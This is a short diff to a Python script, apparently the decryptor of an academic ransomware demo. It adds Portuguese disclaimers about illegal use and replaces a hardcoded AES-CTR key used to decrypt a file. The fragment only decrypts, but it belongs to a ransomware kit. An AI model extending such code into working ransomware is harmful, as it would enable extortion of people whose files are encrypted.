@@ -1,3 +1,5 @@
+## Não me responsabilizo por qualquer uso ilegal do código abaixo.
+## O código foi feito apenas para fins academicos
 import os
 import pyaes
 
@@ -7,8 +9,8 @@ file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
-## chave para descriptografia
-key = b"testeransomwares"
+## chave para descriptografia dos arquivos
+key = b"P@55D3cr1pty@231"
 aes = pyaes.AESModeOfOperationCTR(key)
 decrypt_data = aes.decrypt(file_data)
 
